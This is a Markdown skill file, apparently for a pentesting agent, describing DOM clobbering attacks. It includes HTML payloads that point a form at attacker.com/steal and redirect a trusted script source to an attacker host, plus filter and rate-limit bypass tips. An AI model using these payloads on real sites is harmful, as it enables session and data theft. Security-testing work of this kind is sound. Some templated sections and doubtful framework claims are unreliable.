---
name: web-18-dom-clobbering
sequence: web-18
category: xss
domain: web
description: "DOM Clobbering: overwriting JavaScript global variables via HTML element ID attributes (e.g., <a id=config> hijacks window.config), bypassing CSP via trusted anchor injection, and framework-specific clobbering (Angular, React, jQuery). Use when testing XSS in CSP-restricted contexts."
wordlist_ref: "wordlists/web/web-17-dom-clobbering/"
---

# DOM Clobbering — Web Offensive Methodology

## Quick Workflow

1. Identify where the page reads `window.*` or `document.getElementById` values from DOM
2. Inject HTML elements with `id` or `name` that match the variable name
3. If the variable is used in a security-sensitive context (CSP bypass, form action), clobber it

---

## Detection

### Basic Clobbering Vectors

```html
<!-- target.js uses: if (window.config) ... -->
<a id="config"></a>              <!-- window.config → <a> element -->
<a id="config" href="data:text/html,<script>alert(1)</script>">
```

### Form Confusion

```html
<!-- If page checks: document.forms[0].action -->
<form id="config">
  <input name="action" value="https://attacker.com/steal">
</form>
```

### CSP Bypass via Trusted Anchor

```html
<!-- CSP allows: script-src https://cdn.example.com -->
<!-- Page dynamically loads: script.src = trustedCDN + "/app.js" -->
<a id="trustedCDN" href="https://attacker.com">  <!-- clobbered → loads from attacker -->
```

### Framework-Specific

| Framework | Clobber Target | Effect |
|-----------|---------------|--------|
| AngularJS | `$window` reference | Bypass Angular sandbox |
| jQuery | `$` or `jQuery` | Override jQuery globals |
| React | `dangerouslySetInnerHTML` | If dynamically resolved |
| Express templates | `app` / `locals` | Template variable injection |

---





## Hacker Mindset

**Look for the edge cases.** Vulnerabilities live in the gap between what the developer assumed and what the framework actually does. Test every boundary: empty values, nulls, arrays, negative numbers, Unicode, very long strings.

**Blind detection always needs OOB.** If you can't see the output, set up a callback. No OOB = no confirmation.

**Chaining turns low/med into critical.** A single path traversal is medium. Path traversal + log file + admin session = RCE. Always think about what comes next.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-17-dom-clobbering/`

**Files**:
- `wordlists/web/web-17-dom-clobbering/payloads/xss/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

## References

- PortSwigger DOM Clobbering research
- CVE-2022-40956 (jQuery), CVE-2024-22201 (Angular)
